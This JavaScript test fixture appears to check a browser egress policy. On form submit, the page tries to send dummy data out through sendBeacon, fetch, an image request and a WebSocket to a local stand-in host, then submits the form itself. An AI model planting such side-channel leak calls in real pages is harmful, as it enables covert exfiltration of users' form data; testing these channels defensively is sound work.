// 6E-A: while the SUBMIT egress is open, the page tries every other channel:
// a same-origin POST that is not the submission, and fetch / beacon / image /
// WebSocket to a third party. Only the certified requests may leave. A
// same-origin image GET (allowed by E3_RENDER) is the positive control that
// the probes really ran. Then the page submits itself as authorized.
document.addEventListener("submit", function (event) {
  event.preventDefault();
  var form = event.target;
  try { navigator.sendBeacon("/record/exfil_same_origin_post", "x"); } catch (e) {}
  fetch("/record/exfil_same_origin_fetch", {method: "POST", body: "x", keepalive: true}).catch(function () {});
  fetch("http://127.0.0.1:8431/leak_fetch?d=x", {keepalive: true}).catch(function () {});
  try { navigator.sendBeacon("http://127.0.0.1:8431/leak_beacon", "x"); } catch (e) {}
  var img = new Image(); img.src = "http://127.0.0.1:8431/leak_image.gif?d=x";
  try { var ws = new WebSocket("ws://127.0.0.1:8421/ws/exfil_submit"); ws.onopen = function () { ws.send("x"); }; } catch (e) {}
  var control = new Image(); control.src = "/record/exfil_control.png";
  setTimeout(function () { form.submit(); }, 1200);
});
